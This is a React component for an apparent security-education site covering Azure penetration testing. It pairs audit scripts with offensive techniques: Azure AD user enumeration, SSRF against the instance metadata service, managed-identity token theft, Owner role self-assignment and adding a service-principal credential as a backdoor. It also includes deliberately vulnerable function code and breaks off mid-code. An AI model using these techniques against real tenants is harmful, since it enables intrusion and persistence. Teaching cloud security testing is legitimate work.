
import React from 'react';
import CodeExample from '@/components/CodeExample';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";

const AzureSection: React.FC = () => {
  return (
    <section className="space-y-12">
      <div>
        <h2 className="text-3xl font-bold mb-6">Azure Penetration Testing</h2>
        <p className="mb-8">
          Microsoft Azure is a comprehensive cloud platform with unique security considerations.
          Testing Azure environments requires understanding specific services, authentication mechanisms,
          and potential attack vectors.
        </p>
        
        <Tabs defaultValue="common-vulnerabilities">
          <TabsList>
            <TabsTrigger value="common-vulnerabilities">Common Vulnerabilities</TabsTrigger>
            <TabsTrigger value="testing-approach">Testing Approach</TabsTrigger>
            <TabsTrigger value="tools">Tools</TabsTrigger>
          </TabsList>
          
          <TabsContent value="common-vulnerabilities" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Azure Active Directory Vulnerabilities</h3>
              <p className="mb-4">
                Azure AD is the core identity service for Azure and often contains security issues:
              </p>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Authentication Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Azure AD authentication mechanisms can have several security weaknesses.
                    </p>
                    <h5 className="font-semibold mb-2">Common Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Legacy authentication protocols enabled (basic auth, SMTP auth)</li>
                      <li>Weak password policies allowing simple passwords</li>
                      <li>Missing Multi-Factor Authentication (MFA) for privileged accounts</li>
                      <li>Inadequate conditional access policies</li>
                      <li>MFA fatigue attacks and notification bombing</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Checking Authentication Configurations"
                      code={`# Using AzureAD PowerShell module to check password policies
Connect-AzureAD
Get-AzureADDirectorySettingTemplate
$Template = Get-AzureADDirectorySettingTemplate | Where-Object {$_.DisplayName -eq "Password Rule Settings"}

# Check MFA status for users
Get-MsolUser | Where-Object {$_.StrongAuthenticationRequirements.State -ne "Enforced"} | Select-Object UserPrincipalName

# Check users with legacy authentication
Get-AzureADAuditSignInLogs | Where-Object {$_.ClientAppUsed -eq "Other clients; legacy authentication flow"}`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Service Principal and App Registration Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Service Principals and App Registrations can have dangerous configurations that lead to compromise.
                    </p>
                    <h5 className="font-semibold mb-2">Risk Areas:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Over-privileged service principals with admin-level access</li>
                      <li>Client secrets with excessive lifetimes or no expiration</li>
                      <li>Inadequate credential management</li>
                      <li>Dangerous delegated permissions and consent grants</li>
                      <li>Insecure application ownership</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Examining Service Principals"
                      code={`# List all service principals
Connect-AzureAD
Get-AzureADServicePrincipal -All $true | Select-Object DisplayName, AppId, ObjectId

# Check for credentials expiration
Get-AzureADApplication | ForEach-Object { 
    Get-AzureADApplicationPasswordCredential -ObjectId $_.ObjectId | 
    Select-Object @{Name="AppName"; Expression={$_.DisplayName}}, KeyId, StartDate, EndDate 
}

# Check app permissions
Get-AzureADServicePrincipal -All $true | ForEach-Object {
    $sp = $_
    Get-AzureADServiceAppRoleAssignment -ObjectId $sp.ObjectId | 
    Select-Object @{Name="App"; Expression={$sp.DisplayName}}, ResourceDisplayName, PrincipalDisplayName
}`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">RBAC Misconfigurations</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Role-Based Access Control (RBAC) in Azure is often misconfigured, leading to excessive permissions.
                    </p>
                    <h5 className="font-semibold mb-2">Security Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Overuse of Owner and Contributor roles</li>
                      <li>Custom roles with excessive permissions</li>
                      <li>Inappropriate scope assignments (subscription vs resource group)</li>
                      <li>Missing separation of duties</li>
                      <li>Privilege creep and abandoned access rights</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Azure RBAC Analysis"
                      code={`# Connect to Azure
Connect-AzAccount

# Get role assignments at subscription level
Get-AzRoleAssignment -Scope /subscriptions/00000000-0000-0000-0000-000000000000

# Find users with Owner role
Get-AzRoleAssignment | Where-Object {$_.RoleDefinitionName -eq "Owner"} | Format-Table DisplayName, SignInName, RoleDefinitionName, Scope -AutoSize

# List custom roles that may have excessive permissions
Get-AzRoleDefinition | Where-Object {$_.IsCustom -eq $true} | Select-Object Name, Description

# Examine a specific custom role
Get-AzRoleDefinition -Name "CustomRoleName" | Select-Object -ExpandProperty Actions`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Storage Account Issues</h3>
              <p className="mb-4">
                Azure Storage accounts can have multiple security problems:
              </p>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Blob Container Access Levels</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Blob containers can be configured with public access, leading to data exposure.
                    </p>
                    <h5 className="font-semibold mb-2">Access Levels and Risks:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li><strong>Private (default)</strong>: No anonymous access</li>
                      <li><strong>Blob</strong>: Anonymous read access for blobs only</li>
                      <li><strong>Container</strong>: Anonymous read access for entire container and blobs</li>
                      <li>Public containers may expose sensitive information</li>
                      <li>Anonymous access may allow data exfiltration</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Finding Public Containers"
                      code={`# List storage accounts
Get-AzStorageAccount

# Check public access level for containers
$storageAccount = Get-AzStorageAccount -ResourceGroupName "target-rg" -Name "targetstorageacct"
$storageKey = (Get-AzStorageAccountKey -ResourceGroupName "target-rg" -Name "targetstorageacct")[0].Value
$context = New-AzStorageContext -StorageAccountName "targetstorageacct" -StorageAccountKey $storageKey

# List containers and their access levels
Get-AzStorageContainer -Context $context | Select-Object Name, PublicAccess

# List blobs in a public container
Get-AzStorageBlob -Container "public-container" -Context $context | Select-Object Name, Length, LastModified`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Shared Access Signature (SAS) Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Shared Access Signatures provide limited access to storage account resources but can be misconfigured.
                    </p>
                    <h5 className="font-semibold mb-2">Common Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>SAS tokens with excessive permissions</li>
                      <li>Long expiration times or no expiration</li>
                      <li>Account SAS instead of more restricted Service or User delegation SAS</li>
                      <li>Insecure distribution of SAS tokens</li>
                      <li>Missing IP restrictions or HTTPS-only policies</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Examining SAS Security"
                      code={`# Create a test SAS token to examine properties
$storageAccount = Get-AzStorageAccount -ResourceGroupName "target-rg" -Name "targetstorageacct"
$accountSAS = New-AzStorageAccountSASToken -Context $storageAccount.Context -Service Blob,File,Table,Queue -ResourceType Service,Container,Object -Permission "racwdlup" -ExpiryTime (Get-Date).AddDays(30)

# Examine the SAS token (look for excessive permissions and long expiration)
$accountSAS

# Test SAS token access
$sasContext = New-AzStorageContext -StorageAccountName "targetstorageacct" -SasToken $accountSAS
Get-AzStorageContainer -Context $sasContext

# Check storage account for secure transfer requirement
Get-AzStorageAccount -ResourceGroupName "target-rg" -Name "targetstorageacct" | Select-Object StorageAccountName, EnableHttpsTrafficOnly`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">Network Security Controls</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Storage accounts may have insufficient network access restrictions.
                    </p>
                    <h5 className="font-semibold mb-2">Security Concerns:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Missing firewall rules allowing access from any network</li>
                      <li>Overly permissive IP address ranges</li>
                      <li>Missing private endpoint configurations</li>
                      <li>Bypassed network rules for trusted Microsoft services</li>
                      <li>Inconsistent network security across storage services</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Network Security Assessment"
                      code={`# Check network rules configuration
$storageAccount = Get-AzStorageAccount -ResourceGroupName "target-rg" -Name "targetstorageacct"
$storageAccount.NetworkRuleSet

# Check if public network access is allowed
if ($storageAccount.NetworkRuleSet.DefaultAction -eq "Allow") {
    Write-Host "WARNING: Storage account allows access from all networks by default" -ForegroundColor Red
}

# Check if private endpoint connections exist
Get-AzPrivateEndpointConnection -PrivateLinkResourceId $storageAccount.Id

# Check for specific allowed IP ranges
$storageAccount.NetworkRuleSet.IpRules

# Check for virtual network rules
$storageAccount.NetworkRuleSet.VirtualNetworkRules`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Key Vault Security Issues</h3>
              <p className="mb-4">
                Azure Key Vault may have security misconfigurations:
              </p>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Access Policy Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Key Vault access policies define who can access secrets, keys, and certificates, and with what permissions.
                    </p>
                    <h5 className="font-semibold mb-2">Common Misconfigurations:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Excessive permissions (all permissions for all objects)</li>
                      <li>Too many users with management permissions</li>
                      <li>Missing separation between administrative and data access</li>
                      <li>Service principals with unnecessary access</li>
                      <li>Legacy applications with excessive permissions</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Key Vault Access Assessment"
                      code={`# List Key Vaults
Get-AzKeyVault

# Get access policies for a specific vault
$keyVault = Get-AzKeyVault -VaultName "target-key-vault"
$keyVault.AccessPolicies | Format-Table ObjectId, DisplayName, PermissionsToKeys, PermissionsToSecrets, PermissionsToCertificates -AutoSize

# Check for users with all permissions
$keyVault.AccessPolicies | Where-Object {
    $_.PermissionsToKeys -contains "all" -or
    $_.PermissionsToSecrets -contains "all" -or
    $_.PermissionsToCertificates -contains "all"
} | Select-Object DisplayName, ObjectId

# Identify service principals with access
$keyVault.AccessPolicies | ForEach-Object {
    $objectId = $_.ObjectId
    try {
        $user = Get-AzADUser -ObjectId $objectId -ErrorAction SilentlyContinue
        if (-not $user) {
            $sp = Get-AzADServicePrincipal -ObjectId $objectId -ErrorAction SilentlyContinue
            if ($sp) { 
                Write-Host "Service Principal: $($sp.DisplayName) has access to the Key Vault" 
            }
        }
    } catch {}
}`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Network Security Controls</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Key Vault network security controls restrict from where the vault can be accessed.
                    </p>
                    <h5 className="font-semibold mb-2">Security Risks:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Public network access enabled (default)</li>
                      <li>Missing firewall rules or overly permissive IP ranges</li>
                      <li>Missing virtual network service endpoints</li>
                      <li>Missing private endpoints</li>
                      <li>Bypass enabled for Azure services</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Network Security Assessment"
                      code={`# Check network access configuration
$keyVault = Get-AzKeyVault -VaultName "target-key-vault"
$keyVault.NetworkAcls

# Check if public access is allowed
if ($keyVault.NetworkAcls.DefaultAction -eq "Allow") {
    Write-Host "WARNING: Key Vault allows access from all networks by default" -ForegroundColor Red
}

# Check for specific allowed IP ranges
$keyVault.NetworkAcls.IpAddressRanges

# Check for virtual network rules
$keyVault.NetworkAcls.VirtualNetworkRules

# Check if private endpoint connections exist
Get-AzPrivateEndpointConnection -PrivateLinkResourceId $keyVault.ResourceId`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">Logging and Monitoring Deficiencies</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Insufficient logging and monitoring for Key Vault operations can hide malicious activity.
                    </p>
                    <h5 className="font-semibold mb-2">Security Gaps:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Missing diagnostic settings for auditing</li>
                      <li>Short log retention periods</li>
                      <li>Logs not forwarded to central monitoring</li>
                      <li>No alerting for suspicious access patterns</li>
                      <li>Incomplete logging of management operations</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Logging Assessment"
                      code={`# Check if diagnostic settings are configured
$keyVault = Get-AzKeyVault -VaultName "target-key-vault"
Get-AzDiagnosticSetting -ResourceId $keyVault.ResourceId

# Check what categories are being logged
$diagSettings = Get-AzDiagnosticSetting -ResourceId $keyVault.ResourceId
$diagSettings.Logs | Format-Table Category, Enabled, RetentionPolicy

# Check if logs are sent to Log Analytics
$diagSettings | Where-Object {$_.WorkspaceId -ne $null} | Select-Object Name, WorkspaceId

# Check if logs are sent to Storage Account
$diagSettings | Where-Object {$_.StorageAccountId -ne $null} | Select-Object Name, StorageAccountId`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Azure Function Vulnerabilities</h3>
              <p className="mb-4">
                Serverless Azure Functions can contain security issues:
              </p>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Authentication and Authorization</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Azure Functions may have insufficient authentication and authorization controls.
                    </p>
                    <h5 className="font-semibold mb-2">Common Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Anonymous access to HTTP-triggered functions</li>
                      <li>Function-level authentication instead of fine-grained authorization</li>
                      <li>Misconfigurations in integration with Azure AD</li>
                      <li>Insecure API key management</li>
                      <li>Inadequate implementation of custom authorization</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Function Authentication Assessment"
                      code={`# List function apps
Get-AzFunctionApp

# Check authentication settings
$functionApp = Get-AzFunctionApp -Name "target-function-app" -ResourceGroupName "target-rg"
$authSettings = Get-AzWebAppAuthSettings -ResourceGroupName "target-rg" -Name "target-function-app"

# Check if authentication is enabled
if (-not $authSettings.Enabled) {
    Write-Host "WARNING: Authentication is not enabled for the function app" -ForegroundColor Red
}

# Check for anonymous access in function.json files
# (requires examining the function app files or using Kudu)
# Example function.json with anonymous access:
# {
#   "bindings": [
#     {
#       "authLevel": "anonymous",
#       "type": "httpTrigger",
#       "direction": "in",
#       "name": "req"
#     }
#   ]
# }`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Managed Identity Configuration</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Managed identities provide authentication to Azure services without storing credentials, but can be overprivileged.
                    </p>
                    <h5 className="font-semibold mb-2">Security Concerns:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Excessive permissions assigned to managed identities</li>
                      <li>Managed identity used for multiple unrelated services</li>
                      <li>Unnecessary scope permissions (e.g., subscription-level when resource-specific would suffice)</li>
                      <li>Missing monitoring of managed identity activities</li>
                      <li>Compromised functions can leverage managed identity permissions</li>
                    </ul>
                    <CodeExample 
                      language="powershell"
                      title="Managed Identity Assessment"
                      code={`# Check if managed identity is enabled
$functionApp = Get-AzFunctionApp -Name "target-function-app" -ResourceGroupName "target-rg"
$functionApp.IdentityType

# Get the managed identity object ID
$objectId = $functionApp.Identity.PrincipalId

# List role assignments for the managed identity
Get-AzRoleAssignment -ObjectId $objectId | Format-Table RoleDefinitionName, Scope -AutoSize

# Check for high privilege roles
$highPrivilegeRoles = @("Owner", "Contributor", "User Access Administrator")
Get-AzRoleAssignment -ObjectId $objectId | Where-Object { $highPrivilegeRoles -contains $_.RoleDefinitionName } | Format-Table

# Check access to key resources like Key Vault
$keyVault = Get-AzKeyVault -VaultName "target-key-vault"
$keyVault.AccessPolicies | Where-Object { $_.ObjectId -eq $objectId } | Select-Object PermissionsToKeys, PermissionsToSecrets, PermissionsToCertificates`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">Code and Dependency Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Azure Function code and dependencies may contain security vulnerabilities.
                    </p>
                    <h5 className="font-semibold mb-2">Common Weaknesses:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Outdated dependencies with known vulnerabilities</li>
                      <li>Insecure coding practices (input validation issues, injection vulnerabilities)</li>
                      <li>Hardcoded secrets in function code</li>
                      <li>Overly verbose error messages revealing internal details</li>
                      <li>Inadequate security headers in HTTP responses</li>
                    </ul>
                    <CodeExample 
                      language="javascript"
                      title="Vulnerable Function Code"
                      code={`// Example of a vulnerable Azure Function (JavaScript)
module.exports = async function(context, req) {
    // INSECURE: No input validation
    const userId = req.query.userId;
    
    // INSECURE: SQL Injection vulnerability
    const query = "SELECT * FROM users WHERE id = " + userId;
    
    // INSECURE: Using hardcoded secrets
    const apiKey = "1234567890abcdef";
    
    // INSECURE: Overly verbose error handling
    try {
        // Function logic here
    } catch (error) {
        context.log.error(error);
        context.res = {
            status: 500,
            body: {
                message: "Internal server error",
                details: error.toString(), // Leaks implementation details
                stack: error.stack // Leaks stack trace
            }
        };
    }
};`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Virtual Machine Security Issues</h3>
              <p className="mb-4">
                Azure Virtual Machines can have several security vulnerabilities:
              </p>
              <ul className="list-disc pl-6 space-y-2">
                <li>Missing security updates and patches</li>
                <li>Open network security groups allowing excessive access</li>
                <li>Unprotected management ports (RDP, SSH) exposed to the internet</li>
                <li>Weak authentication mechanisms (password-only, no JIT access)</li>
                <li>Missing disk encryption</li>
                <li>Excessive permissions assigned to VM managed identities</li>
                <li>Insecure VM extensions and custom scripts</li>
              </ul>
              
              <h4 className="text-xl font-bold mt-4 mb-2">Testing VM Security</h4>
              <CodeExample 
                language="powershell"
                title="VM Security Assessment"
                code={`# List VMs
Get-AzVM

# Check if a VM has disk encryption enabled
$vm = Get-AzVM -Name "target-vm" -ResourceGroupName "target-rg"
$statusEncryption = Get-AzVmDiskEncryptionStatus -ResourceGroupName "target-rg" -VMName "target-vm"
$statusEncryption

# Check network security groups associated with VMs
$nic = Get-AzNetworkInterface -ResourceId $vm.NetworkProfile.NetworkInterfaces[0].Id
$nsg = Get-AzNetworkSecurityGroup | Where-Object {$_.Id -eq $nic.NetworkSecurityGroup.Id}

# Check for open management ports in NSG rules
$nsg.SecurityRules | Where-Object {
    $_.Access -eq "Allow" -and
    $_.Direction -eq "Inbound" -and
    ($_.DestinationPortRange -eq "3389" -or $_.DestinationPortRange -eq "22") -and
    ($_.SourceAddressPrefix -eq "*" -or $_.SourceAddressPrefix -eq "Internet")
}`}
              />
            </div>
          </TabsContent>
          
          <TabsContent value="testing-approach" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Step-by-Step Azure Penetration Testing</h3>
              
              <Accordion type="single" collapsible className="w-full">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">1. Reconnaissance</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      The first phase involves identifying Azure resources belonging to the target organization without direct access to their Azure subscription.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Subdomain enumeration to identify Azure-hosted services</li>
                      <li>Identifying Azure Storage accounts, App Services, and Functions</li>
                      <li>Discovering Azure tenant information through DNS and metadata</li>
                      <li>Fingerprinting Azure AD tenant and configurations</li>
                      <li>Searching code repositories for Azure credentials and configurations</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Tools and Techniques:</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Azure Tenant Discovery</h6>
                        <CodeExample 
                          language="bash"
                          title="Tenant Identification"
                          code={`# Using browser to identify Azure AD tenant
# Visit login URL with any email address in target domain
https://login.microsoftonline.com/example.com

# Using PowerShell to check tenant information
$tenantId = (Invoke-RestMethod -Uri "https://login.microsoftonline.com/example.com/v2.0/.well-known/openid-configuration").token_endpoint.Split('/')[3]
Write-Host "Tenant ID: $tenantId"`}
                        />
                      </div>
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Azure Resource Discovery</h6>
                        <CodeExample 
                          language="bash"
                          title="Resource Discovery"
                          code={`# Using Microburst for Azure storage enumeration
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target-company

# Finding Azure App Service sites
Get-AzureWebsites -Base targetcompany
nmap --script http-headers -p 80,443 *.azurewebsites.net`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">Example Process:</h5>
                    <ol className="list-decimal pl-6 mb-3 space-y-1">
                      <li>Start by identifying the target's domains and subdomains</li>
                      <li>Check for CNAME records pointing to Azure services:
                        <ul className="list-disc pl-6 mt-1">
                          <li>*.azurewebsites.net (App Service)</li>
                          <li>*.blob.core.windows.net (Storage)</li>
                          <li>*.cloudapp.azure.com (Cloud Services)</li>
                          <li>*.database.windows.net (SQL Database)</li>
                        </ul>
                      </li>
                      <li>Use naming conventions to discover additional resources:
                        <ul className="list-disc pl-6 mt-1">
                          <li>companyname-dev</li>
                          <li>companyname-test</li>
                          <li>companyname-prod</li>
                          <li>companyname-stage</li>
                        </ul>
                      </li>
                      <li>Search public code repositories for Azure configuration files</li>
                      <li>Look for exposed storage accounts with directory listings enabled</li>
                    </ol>
                    
                    <h5 className="font-semibold mb-2">Expected Outcomes:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>List of Azure resources (Storage accounts, App Services, Functions)</li>
                      <li>Azure AD tenant information</li>
                      <li>Understanding of the target's Azure architecture</li>
                      <li>Potential entry points for further testing</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">2. Initial Access Vector Identification</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase focuses on identifying potential ways to gain initial access to Azure resources.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Testing discovered Storage accounts for public access</li>
                      <li>Checking for weak authentication in Azure AD</li>
                      <li>Testing for exposed management endpoints</li>
                      <li>Identifying vulnerable web applications hosted on Azure</li>
                      <li>Searching for leaked credentials and connection strings</li>
                      <li>Testing for SSRF vulnerabilities to access IMDS</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Storage Account Testing:</h5>
                    <CodeExample 
                      language="bash"
                      title="Storage Access Testing"
                      code={`# Testing for public blob containers
curl -I https://targetcompany.blob.core.windows.net/public

# Listing contents of a public container
curl https://targetcompany.blob.core.windows.net/public?restype=container&comp=list

# Testing for anonymous file share access (rarely allowed but worth checking)
curl -I https://targetcompany.file.core.windows.net/share

# Using MicroBurst for comprehensive enumeration
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base targetcompany
Invoke-EnumerateAzureSubdomains -Base targetcompany`}
                    />
                    
                    <h5 className="font-semibold mb-2">Azure AD Authentication Testing:</h5>
                    <CodeExample 
                      language="powershell"
                      title="Authentication Testing"
                      code={`# Check for password spray protections
# Note: Be extremely cautious with password spraying, as it can lock out accounts
# and trigger security alerts. Often better simulated than actually executed.

# Example of how to check for account existence (user enumeration)
$domains = @("example.com", "example.onmicrosoft.com")
foreach ($domain in $domains) {
    $users = Get-Content "common-usernames.txt"
    foreach ($user in $users) {
        $email = "$user@$domain"
        
        # Using Microsoft Graph API to check if user exists
        # Checking for different error messages can reveal if account exists
        $body = @{
            "resource"="https://graph.microsoft.com"
            "client_id"="1b730954-1685-4b74-9bfd-dac224a7b894" # Azure AD Graph API client ID
            "username"=$email
            "password"="FakePassword123"
            "grant_type"="password"
        }
        
        try {
            $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Body $body -ErrorAction SilentlyContinue
        } catch {
            $errorMsg = $_.ErrorDetails.Message
            
            # Different error messages may indicate account existence
            if ($errorMsg -match "AADSTS50126") {
                Write-Host "$email - Invalid credentials (account exists)"
            } elseif ($errorMsg -match "AADSTS50034") {
                Write-Host "$email - Account doesn't exist"
            }
        }
    }
}`}
                    />
                    
                    <h5 className="font-semibold mb-2">SSRF to Access IMDS:</h5>
                    <CodeExample 
                      language="bash"
                      title="SSRF Testing for IMDS Access"
                      code={`# Basic SSRF test against a vulnerable application
curl -s "https://vulnerable-app.azurewebsites.net/api?url=http://169.254.169.254/metadata/instance"

# Adding the required Metadata header
curl -s "https://vulnerable-app.azurewebsites.net/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" -H "Metadata:true"

# Testing for DNS rebinding vulnerabilities
# 1. Set up DNS entry that initially resolves to allowed domain, then switches to 169.254.169.254
# 2. Make request through vulnerable application to your controlled domain`}
                    />
                    
                    <h5 className="font-semibold mb-2">Expected Outcomes:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Identification of publicly accessible resources</li>
                      <li>Discovery of misconfigured services</li>
                      <li>Possible Azure credentials or connection strings</li>
                      <li>Understanding of authentication configurations</li>
                      <li>Potential SSRF or other vulnerability vectors</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">3. Privilege Escalation</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      After gaining initial access, this phase focuses on increasing privileges within the Azure environment.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Enumerating RBAC permissions of the compromised identity</li>
                      <li>Testing for privilege escalation via managemed identities</li>
                      <li>Exploiting misconfigured service principals</li>
                      <li>Identifying and exploiting Azure AD application consent grants</li>
                      <li>Leveraging Azure App Service and Function vulnerabilities</li>
                      <li>Testing for Contributor to Owner escalation paths</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Common Privilege Escalation Techniques:</h5>
                    <div className="space-y-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: RBAC Escalation</h6>
                        <p className="text-sm mb-2">Exploiting excessive RBAC permissions to gain higher privileges:</p>
                        <CodeExample 
                          language="powershell"
                          title="RBAC Privilege Escalation"
                          code={`# Get current identity permissions
Connect-AzAccount -Credential $cred
Get-AzRoleAssignment -SignInName user@example.com

# If user has User Access Administrator role at any scope
# they can assign themselves higher privileges
New-AzRoleAssignment -SignInName user@example.com -RoleDefinitionName 'Owner' -Scope "/subscriptions/00000000-0000-0000-0000-000000000000"

# If user has Contributor role, they may be able to deploy
# resources that can lead to privilege escalation
# Example: Creating an Azure Automation account with a runbook
# that runs as a managed identity with higher privileges`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: Managed Identity Exploitation</h6>
                        <p className="text-sm mb-2">Using managed identities to gain higher privileges:</p>
                        <CodeExample 
                          language="powershell"
                          title="Managed Identity Privilege Escalation"
                          code={`# From a compromised VM with managed identity
# Get the access token for the managed identity
$response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"}
$token = ($response.Content | ConvertFrom-Json).access_token

# Use the token to make Azure Resource Manager API calls
$headers = @{
    'Authorization' = "Bearer $token"
}
Invoke-RestMethod -Uri 'https://management.azure.com/subscriptions?api-version=2020-01-01' -Headers $headers

# Check what roles the identity has
$subscriptionId = "00000000-0000-0000-0000-000000000000"
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01" -Headers $headers

# If the identity has appropriate permissions, create a backdoor user
if ($currentPermissions -contains "Microsoft.Authorization/roleAssignments/write") {
    # Create backdoor user with Owner role
    # Complex - would require multiple API calls to create user and assign role
}`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: App Registration/Service Principal Abuse</h6>
                        <p className="text-sm mb-2">Exploiting misconfigured app registrations and service principals:</p>
                        <CodeExample 
                          language="powershell"
                          title="Service Principal Exploitation"
                          code={`# If you have Application Administrator role
# you can add credentials to existing service principals
Connect-AzureAD
$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq 'Target Application'"
$startDate = Get-Date
$endDate = $startDate.AddYears(1)
$passwordCred = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordCredential
$passwordCred.StartDate = $startDate
$passwordCred.EndDate = $endDate
$passwordCred.Value = "SuperSecretPassword123"
Add-AzureADServicePrincipalPasswordCredential -ObjectId $sp.ObjectId -PasswordCredential $passwordCred

